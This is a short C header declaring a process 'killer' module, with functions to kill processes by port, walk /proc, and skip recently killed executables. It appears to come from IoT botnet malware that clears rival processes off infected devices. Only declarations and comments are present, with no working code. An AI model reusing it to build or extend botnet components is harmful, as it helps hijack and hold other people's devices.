#pragma once

#include "includes.h"

void killer_init(void);
void killer_kill(void);
BOOL killer_kill_by_port(port_t);

/* Shared entry points — locker (and any future scanner) delegates to these
 * instead of maintaining a duplicate /proc walker. */
void killer_prepare_scan(void);
void killer_scan_once(void);

/* Shared kill-cooldown: returns TRUE if the exe path was killed recently and
 * should be skipped this cycle; on FALSE it stamps the ring with now(). Same
 * ring used by killer's main sweep so cross-caller thrash is prevented too. */
BOOL killer_kill_cooldown(const char *path, int len);
